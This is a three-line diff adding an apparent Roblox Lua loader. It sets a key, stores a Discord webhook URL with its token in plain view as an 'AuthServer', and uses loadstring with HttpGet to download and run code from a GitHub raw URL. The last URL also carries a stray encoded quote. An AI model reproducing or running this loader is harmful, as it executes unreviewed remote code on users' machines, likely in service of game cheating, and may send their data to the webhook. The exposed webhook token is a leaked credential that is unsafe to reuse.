@@ -1,0 +1,3 @@
+_G.Key = "7805otirik"
+_G.AuthServer = "https://discord.com/api/webhooks/1092068408373293087/x3KG9joQ5y4X6Wjf2vag5EteBerdUbbUD_JAC9ICN-v1MYipzWEiTNX1UMNL6wYU406A"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KIDINApsx/versions/main/v1.lua%22))()
